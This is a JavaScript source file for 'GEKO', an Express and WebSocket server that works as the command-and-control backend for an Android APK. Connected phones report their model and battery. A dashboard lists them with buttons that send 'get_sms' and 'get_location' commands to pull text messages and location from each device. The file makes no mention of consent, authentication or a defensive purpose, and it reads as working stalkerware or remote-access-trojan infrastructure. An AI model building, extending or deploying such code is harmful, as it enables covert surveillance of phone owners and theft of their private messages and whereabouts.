// 🦎 GEKO SERVER - SIMPLE & WORKING
const express = require('express');
const WebSocket = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let devices = {};

// WebSocket for APK
wss.on('connection', (ws, req) => {
  const id = Date.now().toString();
  const model = req.headers.model || 'Unknown';
  
  console.log('📱 Connected:', model);
  
  devices[id] = {
    id: id,
    model: model,
    battery: req.headers.battery || '100%',
    ws: ws,
    online: true
  };
  
  ws.on('message', (data) => {
    console.log('📨 From', model + ':', data.toString().substring(0, 30));
  });
  
  ws.on('close', () => {
    console.log('📴 Disconnected:', model);
    if (devices[id]) devices[id].online = false;
  });
});

// API
app.get('/api/devices', (req, res) => {
  const deviceList = Object.values(devices).map(d => ({
    id: d.id,
    model: d.model,
    battery: d.battery,
    online: d.online
  }));
  res.json({ devices: deviceList });
});

app.post('/api/command', (req, res) => {
  const { deviceId, command } = req.body;
  const device = devices[deviceId];
  
  if (device && device.online) {
    device.ws.send(JSON.stringify({ cmd: command }));
    res.json({ success: true });
  } else {
    res.json({ success: false, error: 'Device offline' });
  }
});

// Dashboard
app.get('/dashboard', (req, res) => {
  res.send(`
  <html>
  <head><title>🦎 GEKO</title>
  <style>
    body{background:#000;color:#0f0;font-family:Arial;padding:20px;}
    h1{color:#0f0;}
    .device{border:1px solid #0f0;padding:10px;margin:5px;}
    button{background:#0f0;color:#000;border:none;padding:8px;margin:2px;}
  </style>
  </head>
  <body>
    <h1>🦎 GEKO CONTROL</h1>
    <p>Devices: <span id="count">0</span></p>
    <div id="devices">Loading...</div>
    <script>
      async function load(){
        const res=await fetch('/api/devices');
        const data=await res.json();
        document.getElementById('count').textContent=data.devices.length;
        let h='';
        data.devices.forEach(d=>{
          h+='<div class="device">';
          h+='<h3>'+d.model+' '+(d.online?'🟢':'🔴')+'</h3>';
          h+='<button onclick="sendCmd(\\\\''+d.id+'\\\\',\\\\'get_sms\\\\')">SMS</button>';
          h+='<button onclick="sendCmd(\\\\''+d.id+'\\\\',\\\\'get_location\\\\')">Location</button>';
          h+='</div>';
        });
        document.getElementById('devices').innerHTML=h||'No devices';
      }
      async function sendCmd(id,cmd){
        await fetch('/api/command',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({deviceId:id,command:cmd})
        });
        alert('Command sent');
      }
      setInterval(load,2000);
      load();
    </script>
  </body>
  </html>
  `);
});

app.get('/', (req, res) => res.redirect('/dashboard'));

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('🦎 Server running on port', PORT);
});
